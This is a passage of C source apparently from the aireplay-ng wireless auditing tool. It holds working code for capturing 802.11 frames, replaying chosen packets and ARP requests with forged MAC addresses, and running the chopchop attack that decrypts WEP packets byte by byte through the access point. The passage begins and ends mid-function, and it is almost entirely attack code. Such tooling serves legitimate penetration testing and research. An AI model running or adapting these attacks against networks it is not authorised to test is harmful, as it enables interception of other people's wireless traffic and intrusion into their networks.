                printf( "Association successful :-)\n" );

                tt = time( NULL );
                tr = time( NULL );

                state = 4;      /* assoc. done */
            }
        }
    }

    return( 0 );
}

int capture_ask_packet( int *caplen )
{
    time_t tr;
    struct timeval tv;
    struct tm *lt;

    fd_set rfds;
    long nb_pkt_read;
    int i, j, n, mi_b, mi_s, mi_d;

    FILE *f_cap_out;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;

    if( opt.f_minlen  < 0 ) opt.f_minlen  =   40;
    if( opt.f_maxlen  < 0 ) opt.f_maxlen  = 1500;
    if( opt.f_type    < 0 ) opt.f_type    =    2;
    if( opt.f_subtype < 0 ) opt.f_subtype =    0;
    if( opt.f_iswep   < 0 ) opt.f_iswep   =    1;

    tr = time( NULL );

    nb_pkt_read = 0;

    signal( SIGINT, SIG_DFL );

    while( 1 )
    {
        if( time( NULL ) - tr > 0 )
        {
            tr = time( NULL );
            printf( "\rRead %ld packets...\r", nb_pkt_read );
            fflush( stdout );
        }

        if( opt.s_file == NULL )
        {
            FD_ZERO( &rfds );
            FD_SET( dev.fd_in, &rfds );

            tv.tv_sec  = 1;
            tv.tv_usec = 0;

            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
            {
                if( errno == EINTR ) continue;
                perror( "select failed" );
                return( 1 );
            }

            if( ! FD_ISSET( dev.fd_in, &rfds ) )
                continue;

            gettimeofday( &tv, NULL );

            *caplen = read_packet( h80211, sizeof( h80211 ) );

            if( *caplen  < 0 ) return( 1 );
            if( *caplen == 0 ) continue;
        }
        else
        {
            /* there are no hidden backdoors in this source code */

            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM )
                SWAP32( pkh.caplen );

            tv.tv_sec  = pkh.tv_sec;
            tv.tv_usec = pkh.tv_usec;

            n = *caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) )
            {
                printf( "\r\33[KInvalid packet length %d.\n", n );
                return( 1 );
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

                if( n < 8 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }
        }

        nb_pkt_read++;

        if( filter_packet( h80211, *caplen ) != 0 )
            continue;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
            default: mi_b =  4; mi_d = 16; mi_s = 24; break;
        }

        printf( "\n\n        Size: %d, FromDS: %d, ToDS: %d",
                *caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
        {
            if( ( h80211[27] & 0x20 ) == 0 )
                printf( " (WEP)" );
            else
                printf( " (WPA)" );
        }

        printf( "\n\n" );

        printf( "             BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_b    ], h80211[mi_b + 1],
                h80211[mi_b + 2], h80211[mi_b + 3],
                h80211[mi_b + 4], h80211[mi_b + 5] );

        printf( "         Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_d    ], h80211[mi_d + 1],
                h80211[mi_d + 2], h80211[mi_d + 3],
                h80211[mi_d + 4], h80211[mi_d + 5] );

        printf( "        Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_s    ], h80211[mi_s + 1],
                h80211[mi_s + 2], h80211[mi_s + 3],
                h80211[mi_s + 4], h80211[mi_s + 5] );

        /* print a hex dump of the packet */

        for( i = 0; i < *caplen; i++ )
        {
            if( ( i & 15 ) == 0 )
            {
                if( i == 224 )
                {
                    printf( "\n        --- CUT ---" );
                    break;
                }

                printf( "\n        0x%04x:  ", i );
            }

            printf( "%02x", h80211[i] );

            if( ( i & 1 ) != 0 )
                printf( " " );

            if( i == *caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
            {
                for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
                {
                    printf( "  " );
                    if( ( j & 1 ) != 0 )
                        printf( " " );
                }

                printf( " " );

                for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 126 )
                                  ? '.' : h80211[i - 15 + j] );
            }

            if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
            {
                printf( " " );

                for( j = 0; j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 127 )
                                  ? '.' : h80211[i - 15 + j] );
            }
        }

        printf( "\n\nUse this packet ? " );
        fflush( stdout );
        scanf( "%s", tmpbuf );
        printf( "\n" );

        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
            break;
    }

    pfh_out.magic         = TCPDUMP_MAGIC;
    pfh_out.version_major = PCAP_VERSION_MAJOR;
    pfh_out.version_minor = PCAP_VERSION_MINOR;
    pfh_out.thiszone      = 0;
    pfh_out.sigfigs       = 0;
    pfh_out.snaplen       = 65535;
    pfh_out.linktype      = LINKTYPE_IEEE802_11;

    lt = localtime( &tv.tv_sec );

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_src-%02d%02d-%02d%02d%02d.cap",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "Saving chosen packet in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed\n" );
        return( 1 );
    }

    pkh.tv_sec  = tv.tv_sec;
    pkh.tv_usec = tv.tv_usec;
    pkh.caplen  = *caplen;
    pkh.len     = *caplen;

    n = sizeof( pkh );

    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    n = pkh.caplen;

    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed" );
        return( 1 );
    }

    fclose( f_cap_out );

    return( 0 );
}

int do_attack_interactive( void )
{
    int caplen, n;
    int mi_b, mi_s, mi_d;
    struct timeval tv;
    struct timeval tv2;
    float f, ticks[3];
    unsigned char bssid[6];
    unsigned char smac[6];
    unsigned char dmac[6];

read_packets:

    if( capture_ask_packet( &caplen ) != 0 )
        return( 1 );

    /* rewrite the frame control & MAC addresses */

    switch( h80211[1] & 3 )
    {
        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
        default: mi_b =  4; mi_d = 16; mi_s = 24; break;
    }

    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )
        memcpy( bssid, h80211 + mi_b, 6 );
    else
        memcpy( bssid, opt.r_bssid, 6 );

    if( memcmp( opt.r_smac , NULL_MAC, 6 ) == 0 )
        memcpy( smac, h80211 + mi_s, 6 );
    else
        memcpy( smac, opt.r_smac, 6 );

    if( memcmp( opt.r_dmac , NULL_MAC, 6 ) == 0 )
        memcpy( dmac, h80211 + mi_d, 6 );
    else
        memcpy( dmac, opt.r_dmac, 6 );

    if( opt.r_fctrl != -1 )
    {
        h80211[0] = opt.r_fctrl >>   8;
        h80211[1] = opt.r_fctrl & 0xFF;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
            default: mi_b =  4; mi_d = 16; mi_s = 24; break;
        }
    }

    memcpy( h80211 + mi_b, bssid, 6 );
    memcpy( h80211 + mi_s, smac , 6 );
    memcpy( h80211 + mi_d, dmac , 6 );

    /* loop resending the packet */

	/* Check if airodump-ng is running. If not, print that message */
    printf( "You should also start airodump-ng to capture replies.\n\n" );

    signal( SIGINT, sighandler );
    ctrl_c = 0;

    memset( ticks, 0, sizeof( ticks ) );

    nb_pkt_sent = 0;

    while( 1 )
    {
        if( ctrl_c )
            goto read_packets;

        /* wait for the next timer interrupt, or sleep */

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "read(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;
            ticks[1]++;
            ticks[2]++;
        }
        else
        {
            /* we can't trust usleep, since it depends on the HZ */

            gettimeofday( &tv,  NULL );
            usleep( 1024 );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / 1024;
            ticks[1] += f / 1024;
            ticks[2] += f / 1024;
        }

        /* update the status line */

        if( ticks[1] > 128 )
        {
            ticks[1] = 0;
            printf( "\rSent %ld packets...\33[K\r", nb_pkt_sent );
            fflush( stdout );
        }

        if( ( ticks[2] * opt.r_nbpps ) / 1024 < 1 )
            continue;

        /* threshold reached */

        ticks[2] = 0;

        if( send_packet( h80211, caplen ) < 0 )
            return( 1 );
    }

    return( 0 );
}

int do_attack_arp_resend( void )
{
    int nb_bad_pkt;
    int arp_off1, arp_off2;
    int i, n, caplen, nb_arp;
    long nb_pkt_read, nb_arp_tot;

    time_t tc;
    float f, ticks[3];
    struct timeval tv;
    struct timeval tv2;
    struct tm *lt;

    FILE *f_cap_out;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;
    struct ARP_req * arp;

	if ( opt.ringbuffer )
		arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );
	else
		arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );

    /* capture only WEP data to broadcast address */

    opt.f_type    = 2;
    opt.f_subtype = 0;
    opt.f_iswep   = 1;

    memset( opt.f_dmac, 0xFF, 6 );

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-b).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    /* create and write the output pcap header */

    gettimeofday( &tv, NULL );

    pfh_out.magic         = TCPDUMP_MAGIC;
    pfh_out.version_major = PCAP_VERSION_MAJOR;
    pfh_out.version_minor = PCAP_VERSION_MINOR;
    pfh_out.thiszone      = 0;
    pfh_out.sigfigs       = 0;
    pfh_out.snaplen       = 65535;
    pfh_out.linktype      = LINKTYPE_IEEE802_11;

    lt = localtime( &tv.tv_sec );

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_arp-%02d%02d-%02d%02d%02d.cap",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "Saving ARP requests in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed\n" );
        return( 1 );
    }

    fflush( f_cap_out );

    printf( "You should also start airodump-ng to capture replies.\n" );

    /* avoid blocking on reading the socket */

    if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
    {
        perror( "fcntl(O_NONBLOCK) failed" );
        return( 1 );
    }

    memset( ticks, 0, sizeof( ticks ) );

    tc = time( NULL ) - 11;

    nb_pkt_read = 0;
    nb_bad_pkt  = 0;
    nb_arp      = 0;
    nb_arp_tot  = 0;
    arp_off1    = 0;
    arp_off2    = 0;

    while( 1 )
    {
        /* sleep until the next clock tick */

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "read(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;
            ticks[1]++;
            ticks[2]++;
        }
        else
        {
            gettimeofday( &tv,  NULL );
            usleep( 976 );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / 976;
            ticks[1] += f / 976;
            ticks[2] += f / 976;
        }

        if( ticks[1] > 128 )
        {
            ticks[1] = 0;
            printf( "\rRead %ld packets (got %ld ARP requests), "
                    "sent %ld packets...\r",
                    nb_pkt_read, nb_arp_tot, nb_pkt_sent );
            fflush( stdout );
        }

        if( ( ticks[2] * opt.r_nbpps ) / 1024 >= 1 )
        {
            /* threshold reach, send one frame */

            ticks[2] = 0;

            if( nb_arp > 0 )
            {
                if( send_packet( arp[arp_off1].buf,
                                 arp[arp_off1].len ) < 0 )
                    return( 1 );

                if( ++arp_off1 >= nb_arp )
                    arp_off1 = 0;
            }
        }

        /* read a frame, and check if it's an ARP request */

        if( opt.s_file == NULL )
        {
            gettimeofday( &tv, NULL );

            caplen = read_packet( h80211, sizeof( h80211 ) );

            if( caplen  < 0 ) return( 1 );
            if( caplen == 0 ) continue;
        }
        else
        {
            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                opt.s_file = NULL;
                continue;
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM )
                SWAP32( pkh.caplen );

            tv.tv_sec  = pkh.tv_sec;
            tv.tv_usec = pkh.tv_usec;

            n = caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) )
            {
                printf( "\r\33[KInvalid packet length %d.\n", n );
                opt.s_file = NULL;
                continue;
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                opt.s_file = NULL;
                continue;
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

                if( n < 8 || n >= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }
        }

        nb_pkt_read++;

        /* check if it's a disas. or deauth packet */

        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&
            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
        {
            nb_bad_pkt++;

            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )
            {
                printf( "\33[KNotice: got a deauth/disassoc packet. Is the "
                        "source MAC associated ?\n" );

                tc = time( NULL );
                nb_bad_pkt = 0;
            }
        }

        /* check if it's a potential ARP request */

        opt.f_minlen = opt.f_maxlen = 68;

        if( filter_packet( h80211, caplen ) == 0 )
            goto add_arp;

        opt.f_minlen = opt.f_maxlen = 86;

        if( filter_packet( h80211, caplen ) == 0 )
        {
add_arp:
            switch( h80211[1] & 3 )
            {
                case  1: /* ToDS */
                {
                    /* keep as a ToDS packet */

                    memcpy( h80211 +  4, opt.f_bssid, 6 );
                    memcpy( h80211 + 10, opt.r_smac,  6 );
                    memcpy( h80211 + 16, opt.f_dmac,  6 );

                    h80211[1] = 0x41;   /* ToDS & WEP  */
                }
                case  2: /* FromDS */
                {
                    if( opt.r_fromdsinj )
                    {
                        /* keep as a FromDS packet */

                        memcpy( h80211 +  4, opt.f_dmac,  6 );
                        memcpy( h80211 + 10, opt.f_bssid, 6 );
                        memcpy( h80211 + 16, opt.r_smac,  6 );

                        h80211[1] = 0x42;   /* FromDS & WEP  */
                    }
                    else
                    {
                        /* rewrite header to make it a ToDS packet */

                        memcpy( h80211 +  4, opt.f_bssid, 6 );
                        memcpy( h80211 + 10, opt.r_smac,  6 );
                        memcpy( h80211 + 16, opt.f_dmac,  6 );

                        h80211[1] = 0x41;   /* ToDS & WEP  */
                    }
                }
            }

            h80211[0] = 0x08;   /* normal data */

            /* if same IV, perhaps our own packet, skip it */

            for( i = 0; i < nb_arp; i++ )
            {
                if( memcmp( h80211 + 24, arp[i].buf + 24, 4 ) == 0 )
                    break;
            }

            if( i < nb_arp )
                continue;

            /* add the ARP request in the ring buffer */

            nb_arp_tot++;

			/* Ring buffer size: by default: 8 ) */

            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)
            {
                /* no more room, overwrite oldest entry */

                memcpy( arp[arp_off2].buf, h80211, caplen );
                arp[arp_off2].len = caplen;

                if( ++arp_off2 >= nb_arp )
                    arp_off2 = 0;
            } else {

                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {
                    perror( "malloc failed" );
                    return( 1 );
                }

                memcpy( arp[nb_arp].buf, h80211, caplen );
                arp[nb_arp].len = caplen;
                nb_arp++;

                pkh.tv_sec  = tv.tv_sec;
                pkh.tv_usec = tv.tv_usec;
                pkh.caplen  = caplen;
                pkh.len     = caplen;

                n = sizeof( pkh );

                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {
                    perror( "fwrite failed" );
                    return( 1 );
                }

                n = pkh.caplen;

                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {
                    perror( "fwrite failed" );
                    return( 1 );
                }

                fflush( f_cap_out );
            }
        }
    }

    return( 0 );
}

int do_attack_chopchop( void )
{
    float f, ticks[4];
    int i, j, n, z, caplen;
    int data_start, data_end;
    int guess, is_deauth_mode;
    int nb_bad_pkt;
    
    unsigned char b1 = 0xAA;
    unsigned char b2 = 0xAA;

    FILE *f_cap_out;
    long nb_pkt_read;
    unsigned long crc_mask;
    unsigned char *chopped;

    time_t tt;
    struct tm *lt;
    struct timeval tv;
    struct timeval tv2;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;

    srand( time( NULL ) );

    if( capture_ask_packet( &caplen ) != 0 )
        return( 1 );

    /* Special handling for spanning-tree packets */
    if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||
        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )
    {
        b1 = 0x42; b2 = 0x42;
    }

    printf( "\n" );

    /* chopchop operation mode: truncate and decrypt the packet */
    /* we assume the plaintext starts with  AA AA 03 00 00 00   */
    /* (42 42 03 00 00 00 for spanning-tree packets)            */

    memcpy( srcbuf, h80211, caplen );

    /* setup the chopping buffer */

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;

    n = caplen - z + 24;

    if( ( chopped = (unsigned char *) malloc( n ) ) == NULL )
    {
        perror( "malloc failed" );
        return( 1 );
    }

    memset( chopped, 0, n );

    data_start = z + 4;
    data_end   = caplen;

    chopped[0] = 0x08;  /* normal data frame */
    chopped[1] = 0x41;  /* WEP = 1, ToDS = 1 */

    /* copy the duration */

    memcpy( chopped + 2, h80211 + 2, 2 );

    /* copy the BSSID */

    switch( h80211[1] & 3 )
    {
        case  0: memcpy( chopped + 4, h80211 + 16, 6 ); break;
        case  1: memcpy( chopped + 4, h80211 +  4, 6 ); break;
        case  2: memcpy( chopped + 4, h80211 + 10, 6 ); break;
        default: memcpy( chopped + 4, h80211 +  4, 6 ); break;
    }

    /* copy the WEP IV */

    memcpy( chopped + 24, h80211 + z, 4 );

    /* setup the xor mask to hide the original data */

    crc_mask = 0;

    for( i = data_start; i < data_end - 4; i++ )
    {
        switch( i - data_start )
        {
            case  0: chopped[i] = b1 ^ 0xE0; break;
            case  1: chopped[i] = b2 ^ 0xE0; break;
            case  2: chopped[i] = 0x03 ^ 0x03; break;
            default: chopped[i] = 0x55 ^ ( i & 0xFF ); break;
        }

        crc_mask = crc_tbl[crc_mask & 0xFF]
                 ^ ( crc_mask   >>  8 )
                 ^ ( chopped[i] << 24 );
    }

    for( i = 0; i < 4; i++ )
        crc_mask = crc_tbl[crc_mask & 0xFF]
                 ^ ( crc_mask >> 8 );

    chopped[data_end - 4] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 3] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 2] = crc_mask; crc_mask >>= 8;
    chopped[data_end - 1] = crc_mask; crc_mask >>= 8;

    for( i = data_start; i < data_end; i++ )
        chopped[i] ^= srcbuf[i];

    data_start += 6; /* skip the SNAP header */

    /* if the replay source mac is unspecified, forge one */

    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
    {
        is_deauth_mode = 1;

        opt.r_smac[0] = 0x00;
        opt.r_smac[1] = rand() & 0x3E;
        opt.r_smac[2] = rand() & 0xFF;
        opt.r_smac[3] = rand() & 0xFF;
        opt.r_smac[4] = rand() & 0xFF;

        memcpy( opt.r_dmac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
    }
    else
    {
        is_deauth_mode = 0;

        opt.r_dmac[0] = 0xFF;
        opt.r_dmac[1] = rand() & 0xFE;
        opt.r_dmac[2] = rand() & 0xFF;
        opt.r_dmac[3] = rand() & 0xFF;
        opt.r_dmac[4] = rand() & 0xFF;
    }

    /* let's go chopping */

    memset( ticks, 0, sizeof( ticks ) );

    nb_pkt_read = 0;
    nb_pkt_sent = 0;
    nb_bad_pkt  = 0;
    guess       = 256;

    tt = time( NULL );

    alarm( 30 );

    signal( SIGALRM, sighandler );

    if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
    {
        perror( "fcntl(O_NONBLOCK) failed" );
        return( 1 );
    }

    while( data_end > data_start )
    {
        if( alarmed )
        {
            printf( "\n\n"
"The chopchop attack appears to have failed. Possible reasons:\n"
"\n"
"    * You're trying to inject with an unsupported chipset (Centrino?).\n"
"    * The driver source wasn't properly patched for injection support.\n"
"    * You are too far from the AP. Get closer or reduce the send rate.\n"
"    * Target is 802.11g only but you are using a Prism2 or RTL8180.\n"
"    * The wireless interface isn't setup on the correct channel.\n" );

            if( is_deauth_mode )
                printf(
"    * The AP isn't vulnerable when operating in non-authenticated mode.\n"
"      Run aireplay-ng in authenticated mode instead (-h option).\n\n" );
            else
                printf(
"    * The client MAC you have specified is not currently authenticated.\n"
"      Try running another aireplay-ng to fake authentication (attack \"-1\").\n"
"    * The AP isn't vulnerable when operating in authenticated mode.\n"
"      Try aireplay-ng in non-authenticated mode instead (no -h option).\n\n" );
            return( 1 );
        }

        /* wait for the next timer interrupt, or sleep */

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "\nread(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;  /* ticks since we entered the while loop     */
            ticks[1]++;  /* ticks since the last status line update   */
            ticks[2]++;  /* ticks since the last frame was sent       */
            ticks[3]++;  /* ticks since started chopping current byte */
        }
        else
        {
            /* we can't trust usleep, since it depends on the HZ */

            gettimeofday( &tv,  NULL );
            usleep( 976 );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / 976;
            ticks[1] += f / 976;
            ticks[2] += f / 976;
            ticks[3] += f / 976;
        }

        /* update the status line */

        if( ticks[1] > 128 )
        {
            ticks[1] = 0;
            printf( "\rSent %3ld packets, current guess: %02X...\33[K",
                    nb_pkt_sent, guess );
            fflush( stdout );
        }

        if( data_end < 41 && ticks[3] > 8 * ( ticks[0] - ticks[3] ) /
                                (int) ( caplen - ( data_end - 1 ) ) )
        {
            header_rec:

            printf( "\n\nThe AP appears to drop packets shorter "
                    "than %d bytes.\n",data_end );

			data_end = 40;

            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;

            if( ( chopped[data_end + 0] ^ srcbuf[data_end + 0] ) == 0x06 &&
                ( chopped[data_end + 1] ^ srcbuf[data_end + 1] ) == 0x04 &&
                ( chopped[data_end + 2] ^ srcbuf[data_end + 2] ) == 0x00 )
            {
                printf( "Enabling standard workaround: "
                        "ARP header re-creation.\n" );

                chopped[z + 10] = srcbuf[z + 10] ^ 0x08;
                chopped[z + 11] = srcbuf[z + 11] ^ 0x06;
                chopped[z + 12] = srcbuf[z + 12] ^ 0x00;
                chopped[z + 13] = srcbuf[z + 13] ^ 0x01;
                chopped[z + 14] = srcbuf[z + 14] ^ 0x08;
                chopped[z + 15] = srcbuf[z + 15] ^ 0x00;
            }
            else
            {
                printf( "Enabling standard workaround: "
                        " IP header re-creation.\n" );

                n = caplen - ( z + 16 );

                chopped[z +  4] = srcbuf[z +  4] ^ 0xAA;
                chopped[z +  5] = srcbuf[z +  5] ^ 0xAA;
                chopped[z +  6] = srcbuf[z +  6] ^ 0x03;
                chopped[z +  7] = srcbuf[z +  7] ^ 0x00;
                chopped[z +  8] = srcbuf[z +  8] ^ 0x00;
                chopped[z +  9] = srcbuf[z +  9] ^ 0x00;
                chopped[z + 10] = srcbuf[z + 10] ^ 0x08;
                chopped[z + 11] = srcbuf[z + 11] ^ 0x00;
                chopped[z + 14] = srcbuf[z + 14] ^ ( n >> 8 );
                chopped[z + 15] = srcbuf[z + 15] ^ ( n & 0xFF );

                memcpy( h80211, srcbuf, caplen );

                for( i = z + 4; i < (int) caplen; i++ )
                    h80211[i - 4] = h80211[i] ^ chopped[i];

                /* sometimes the header length or the tos field vary */

                for( i = 0; i < 16; i++ )
                {
                     h80211[z +  8] = 0x40 + i;
                    chopped[z + 12] = srcbuf[z + 12] ^ ( 0x40 + i );

                    for( j = 0; j < 256; j++ )
                    {
                         h80211[z +  9] = j;
                        chopped[z + 13] = srcbuf[z + 13] ^ j;

                        if( check_crc_buf( h80211 + z, caplen - z - 8 ) )
                            goto have_crc_match;
                    }
                }

                printf( "This doesn't look like an IP packet, "
                        "try another one.\n" );
            }

        have_crc_match:
            break;
        }

        if( ( ticks[2] * opt.r_nbpps ) / 1024 >= 1 )
        {
            /* send one modified frame */

            ticks[2] = 0;

            memcpy( h80211, chopped, data_end - 1 );

            /* note: guess 256 is special, it tests if the  *
             * AP properly drops frames with an invalid ICV *
             * so this guess always has its bit 8 set to 0  */

            if( is_deauth_mode )
            {
                opt.r_smac[1] |= ( guess < 256 );
                opt.r_smac[5]  = guess & 0xFF;
            }
            else
            {
                opt.r_dmac[1] |= ( guess < 256 );
                opt.r_dmac[5]  = guess & 0xFF;
            }

            memcpy( h80211 + 10, opt.r_smac,  6 );
            memcpy( h80211 + 16, opt.r_dmac,  6 );

            if( guess < 256 )
            {
                h80211[data_end - 2] ^= crc_chop_tbl[guess][3];
                h80211[data_end - 3] ^= crc_chop_tbl[guess][2];
                h80211[data_end - 4] ^= crc_chop_tbl[guess][1];
                h80211[data_end - 5] ^= crc_chop_tbl[guess][0];
            }

            errno = 0;

            if( send_packet( h80211, data_end -1 ) != 0 )
                return( 1 );

            if( errno != EAGAIN )
            {
                guess++;

                if( guess > 256 )
                    guess = 0;
            }
        }

        /* watch for a response from the AP */

        n = read_packet( h80211, sizeof( h80211 ) );

        if( n  < 0 ) return( 1 );
        if( n == 0 ) continue;

        nb_pkt_read++;

        /* check if it's a deauth packet */

        if( h80211[0] == 0xA0 || h80211[0] == 0xC0 )
        {
            if( memcmp( h80211 + 4, opt.r_smac, 6 ) == 0 &&
                ! is_deauth_mode )
            {
                nb_bad_pkt++;

                if( nb_bad_pkt > 256 )
                {
                    printf(
                "\n\nFailure: got several deauthentication packets "
                "from the AP - try running\nanother aireplay-ng with "
                "attack \"-1\" (fake open-system authentication).\n\n" );
                    return( 1 );
                }

                continue;
            }

            if( h80211[4] != opt.r_smac[0] ) continue;
            if( h80211[6] != opt.r_smac[2] ) continue;
            if( h80211[7] != opt.r_smac[3] ) continue;
            if( h80211[8] != opt.r_smac[4] ) continue;

            if( ( h80211[5]     & 0xFE ) !=
                ( opt.r_smac[1] & 0xFE ) ) continue;

            if( ! ( h80211[5] & 1 ) )
            {
            	if( data_end < 41 ) goto header_rec;

                printf( "\n\nFailure: the access point does not properly "
                        "discard frames with an\ninvalid ICV - try running "
                        "aireplay-ng in authenticated mode (-h) instead.\n\n" );
                return( 1 );
            }
        }
        else
        {
            if( is_deauth_mode )
                continue;

            /* check if it's a WEP data packet */

            if( ( h80211[0] & 0x0C ) != 8 ) continue;
            if( ( h80211[0] & 0xF0 ) != 0 ) continue;
            if( ( h80211[1] & 0x03 ) != 2 ) continue;
            if( ( h80211[1] & 0x40 ) == 0 ) continue;

            /* check the extended IV (TKIP) flag */

            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;

            if( ( h80211[z + 3] & 0x20 ) != 0 ) continue;

            /* check the destination address */

            if( h80211[4] != opt.r_dmac[0] ) continue;
            if( h80211[6] != opt.r_dmac[2] ) continue;
            if( h80211[7] != opt.r_dmac[3] ) continue;
            if( h80211[8] != opt.r_dmac[4] ) continue;

            if( ( h80211[5]     & 0xFE ) !=
                ( opt.r_dmac[1] & 0xFE ) ) continue;

            if( ! ( h80211[5] & 1 ) )
            {
            	if( data_end < 41 ) goto header_rec;

                printf( "\n\nFailure: the access point does not properly "
                        "discard frames with an\ninvalid ICV - try running "
                        "aireplay-ng in non-authenticated mode instead.\n\n" );
                return( 1 );
            }
        }

        /* we have a winner */

        guess = h80211[9];

        chopped[data_end - 1] ^= guess;
        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
